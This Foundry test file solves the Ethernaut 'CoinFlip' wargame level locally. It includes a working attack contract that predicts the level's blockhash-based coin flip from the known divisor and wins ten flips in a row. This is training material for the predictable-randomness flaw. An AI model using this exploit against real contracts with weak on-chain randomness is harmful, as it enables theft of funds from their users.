// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/CoinFlip/CoinFlipFactory.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

// forge test --match-contract CoinFlipTest -vvvv
contract CoinFlipTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our address 5 ether
    }

    function testCoinFlipHack() public {
        /****************
         * Factory setup *
         *************** */
        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));

        /****************
         *    Attack     *
         *************** */
         /*
         * the goal of this contract is to guess the correct outcome 10 times in a row
         * Walkthrough:
         * 1) Sets block.height
         * 2) Call attack contract.
         * 3) Run the attack function 10 times
          */
        // -- 1 --
        vm.roll(1);
        // -- 2 --
        CoinFlipHack coinFlipHack = new CoinFlipHack(levelAddress);
        // -- 3 --
        for (uint i = 0; i <= 10; i++) {
            vm.roll(1 + i); // must set new block height
            coinFlipHack.attack();
        }

        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
/*
* Attack contract:
* 1) Instanciate the challenge contract
* 2) We know the factor used in the CoinFlip contract so we can fake the calls and know before calling the flip function
*/

contract CoinFlipHack {
    CoinFlip public challenge;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    // -- 1 --
    constructor(address challengeAddress) {
        challenge = CoinFlip(payable(challengeAddress));
    }
    // -- 2 --
    function attack() external payable {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        challenge.flip(side);
    }

    fallback() external payable {}
}
